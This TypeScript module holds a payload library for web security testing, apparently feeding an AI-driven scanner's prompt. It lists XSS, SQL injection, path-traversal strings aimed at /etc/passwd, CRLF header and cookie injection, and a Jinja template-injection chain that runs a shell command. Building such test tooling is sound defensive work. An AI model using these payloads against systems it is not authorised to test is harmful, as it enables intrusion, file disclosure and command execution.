export type PayloadCategory = "xss" | "sqli" | "idor" | "csrf" | "path-traversal" | "header-injection" | "template-injection";

export interface SecurityPayload {
  vector: string;
  category: PayloadCategory;
  label: string;
  owaspRef?: string;
  target: "input" | "url" | "header" | "param";
}

const CATEGORY_ORDER: PayloadCategory[] = [
  "xss",
  "sqli",
  "idor",
  "csrf",
  "path-traversal",
  "header-injection",
  "template-injection",
];

const CATEGORY_LABELS: Record<PayloadCategory, string> = {
  xss: "XSS",
  sqli: "SQLi",
  idor: "IDOR",
  csrf: "CSRF",
  "path-traversal": "Path Traversal",
  "header-injection": "Header Injection",
  "template-injection": "Template Injection",
};

export const BUILT_IN_PAYLOADS: SecurityPayload[] = [
  { vector: "<script>alert(1)</script>", category: "xss", label: "Basic script tag", owaspRef: "A03:2021 Injection", target: "input" },
  { vector: "<img src=x onerror=alert(1)>", category: "xss", label: "Image onerror handler", owaspRef: "A03:2021 Injection", target: "input" },
  { vector: "<body onload=alert(1)>", category: "xss", label: "Body onload handler", owaspRef: "A03:2021 Injection", target: "input" },
  { vector: "<svg/onload=alert(1)>", category: "xss", label: "SVG onload execution", owaspRef: "A03:2021 Injection", target: "input" },
  { vector: "<iframe src=javascript:alert(1)>", category: "xss", label: "Javascript iframe source", owaspRef: "A03:2021 Injection", target: "input" },
  { vector: "javascript:alert(1)//", category: "xss", label: "Javascript URI", owaspRef: "A03:2021 Injection", target: "url" },
  { vector: "&#60;script&#62;alert(1)&#60;/script&#62;", category: "xss", label: "HTML-encoded script tag", owaspRef: "A03:2021 Injection", target: "input" },
  { vector: "#<img src=x onerror=alert(document.domain)>", category: "xss", label: "DOM-based hash payload", owaspRef: "A03:2021 Injection", target: "url" },
  { vector: "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>", category: "xss", label: "Polyglot XSS", owaspRef: "A03:2021 Injection", target: "url" },
  { vector: "' OR '1'='1", category: "sqli", label: "Classic OR true", owaspRef: "A03:2021 Injection", target: "param" },
  { vector: "\" OR 1=1 --", category: "sqli", label: "Double-quote break", owaspRef: "A03:2021 Injection", target: "param" },
  { vector: "' UNION SELECT NULL,NULL --", category: "sqli", label: "UNION SELECT probe", owaspRef: "A03:2021 Injection", target: "param" },
  { vector: "admin'--", category: "sqli", label: "Comment-based auth bypass", owaspRef: "A03:2021 Injection", target: "input" },
  { vector: "' OR SLEEP(5)--", category: "sqli", label: "Blind time-based sleep", owaspRef: "A03:2021 Injection", target: "param" },
  { vector: "1;WAITFOR DELAY '0:0:5'--", category: "sqli", label: "SQL Server time delay", owaspRef: "A03:2021 Injection", target: "param" },
  { vector: "../users/2", category: "idor", label: "Sequential object ID swap", owaspRef: "A01:2021 Broken Access Control", target: "url" },
  { vector: "accountId=999999", category: "idor", label: "High-value object identifier", owaspRef: "A01:2021 Broken Access Control", target: "param" },
  { vector: "csrf_token=stale-or-empty", category: "csrf", label: "Missing or stale CSRF token", owaspRef: "A01:2021 Broken Access Control", target: "param" },
  { vector: "Origin: https://evil.example", category: "csrf", label: "Cross-site origin header", owaspRef: "A01:2021 Broken Access Control", target: "header" },
  { vector: "../../../etc/passwd", category: "path-traversal", label: "Basic traversal", owaspRef: "A01:2021 Broken Access Control", target: "param" },
  { vector: "..%2f..%2f..%2fetc%2fpasswd", category: "path-traversal", label: "URL-encoded slash traversal", owaspRef: "A01:2021 Broken Access Control", target: "url" },
  { vector: "..%252f..%252f..%252fetc%252fpasswd", category: "path-traversal", label: "Double-encoded traversal", owaspRef: "A01:2021 Broken Access Control", target: "url" },
  { vector: "../../../etc/passwd%00", category: "path-traversal", label: "Null-byte traversal", owaspRef: "A01:2021 Broken Access Control", target: "param" },
  { vector: "good.example%0d%0aX-Injected-Header: injected", category: "header-injection", label: "CRLF header split", owaspRef: "A03:2021 Injection", target: "header" },
  { vector: "%0d%0aSet-Cookie: injected=1", category: "header-injection", label: "Response header injection", owaspRef: "A03:2021 Injection", target: "header" },
  { vector: "evil.example", category: "header-injection", label: "Host header override", owaspRef: "A01:2021 Broken Access Control", target: "header" },
  { vector: "{{7*7}}", category: "template-injection", label: "Arithmetic probe", owaspRef: "A03:2021 Injection", target: "input" },
  { vector: "${7*7}", category: "template-injection", label: "Template literal probe", owaspRef: "A03:2021 Injection", target: "input" },
  { vector: "{{config.items()}}", category: "template-injection", label: "Jinja config disclosure", owaspRef: "A03:2021 Injection", target: "input" },
  { vector: "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}", category: "template-injection", label: "Jinja command execution chain", owaspRef: "A03:2021 Injection", target: "input" },
];

export function getPayloads(categories?: PayloadCategory[]): SecurityPayload[] {
  if (!categories || categories.length === 0) {
    return [...BUILT_IN_PAYLOADS];
  }

  const allowedCategories = new Set(categories);
  return BUILT_IN_PAYLOADS.filter((payload) => allowedCategories.has(payload.category));
}

export function getPayloadsForTarget(target: SecurityPayload["target"]): SecurityPayload[] {
  return BUILT_IN_PAYLOADS.filter((payload) => payload.target === target);
}

export function formatPayloadsForPrompt(payloads: SecurityPayload[]): string {
  if (payloads.length === 0) {
    return "## Security Payloads\n- none";
  }

  const grouped = new Map<PayloadCategory, SecurityPayload[]>();

  for (const payload of payloads) {
    const existing = grouped.get(payload.category);
    if (existing) {
      existing.push(payload);
      continue;
    }

    grouped.set(payload.category, [payload]);
  }

  const lines = ["## Security Payloads"];

  for (const category of CATEGORY_ORDER) {
    const categoryPayloads = grouped.get(category);
    if (!categoryPayloads || categoryPayloads.length === 0) {
      continue;
    }

    lines.push(`### ${CATEGORY_LABELS[category]}`);
    for (const payload of categoryPayloads) {
      const owaspSuffix = payload.owaspRef ? ` · ${payload.owaspRef}` : "";
      lines.push(`- \`${payload.vector}\` — ${payload.label}${owaspSuffix}`);
    }
  }

  return lines.join("\n");
}